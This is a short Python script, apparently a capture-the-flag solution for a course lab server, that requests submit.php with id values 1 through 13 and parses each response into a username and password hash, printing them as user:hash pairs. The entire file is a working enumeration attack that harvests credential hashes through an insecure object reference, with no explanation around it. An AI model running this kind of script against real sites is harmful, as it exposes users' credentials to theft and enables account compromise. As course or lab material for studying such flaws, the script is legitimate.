import requests
entries = []

for i in range(1,14):
    url=f"https://cs4401shell.walls.ninja/problem/60946/submit.php?id={i}"
    r = requests.get(url)
    entries.append(r.text)


for entry in entries:
    user = entry.split('\n')[1].split(' ')[-1]
    hash = entry.split('\n')[-2].split(' ')[-1]
    print(f"{user}:{hash}")
